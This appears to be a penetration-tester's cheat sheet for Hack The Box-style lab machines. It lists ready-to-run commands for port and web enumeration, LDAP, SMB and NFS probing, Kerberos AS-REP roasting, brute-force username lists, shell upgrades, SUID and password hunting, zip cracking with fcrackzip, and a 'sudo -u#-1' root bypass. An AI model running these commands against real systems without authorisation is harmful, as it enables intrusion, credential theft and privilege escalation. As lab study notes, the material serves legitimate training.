Initial recon 
nmap -p- -sV -A -Pn 10.10.10.10
http/https_open?:
```
	-gobuster
	-content discovery via burp
	-wfuzz -c -w /root/xPayloads/SecLists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://example.com/FUZZ.txt" -t 100
	-python3 ./dirsearch.py -u http://10.10.10.175 -e *
	-cewl -w wordlists.txt -d 10 -m 1 http://blunder.htb/
```
users?:
```
	-grab from site About US
	-create user list:
		-John Doe
			-jdoe
			-johndoe
			-john.doe
```
rpc-bind?:
```
	-showmount -e 10.10.10.10.
		-mount -t nfs 10.10.10.100:/site_backups /root/HTB/remote/site_backup
		-grep -iR "admin" ./
```
dns-open?:
```
	-dnsrecon -d 10.10.10.100 -r 10.0.0.0/8
```
kerberos_open?:
```
	-try to bruteforce users, create list from site or try to withdraw from ldap
	-GetNPUsers.py
```
ldap_open?:
```
	-nslookup; server 10.10.10.100 ; 127.0.0.1; 10.10.10.100
	-ldapsearch -x -h 10.10.10.175 -p 389 -s base namingcontexts
	-ldapsearch -x -h 10.10.10.175 -p 389 -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
		-or nmap -p 389 --script ldap-search
```
smb_open?:
	-locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
	-nmap --script safe -p 445 10.10.10.100
	-nmap --script smb-enum-services -p 445 10.10.10.100
	-smbclient -L //10.10.10.100
	-smbmap -H 10.10.10.100
		-smbap -R replication -H 10.10.10.10. -A Groups.xml -q



linux shell:
```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
linux priv esc:
```
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
id 
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
sudo -l
# User privilege specification
root    ALL=(ALL:ALL) ALL
sudo -u#-1 /bin/bash

LinEnum.sh
linuxprivchecker.py
nmap -p- 127.0.0.1
Search password in filses:
-find / -name "*backup*" 2>/dev/null
-find / -name "*users*" 2>/dev/null
-in webapp db or config (google)
```
zip_file?:
```
fcrackzip -D -p rockyou test.zip
```
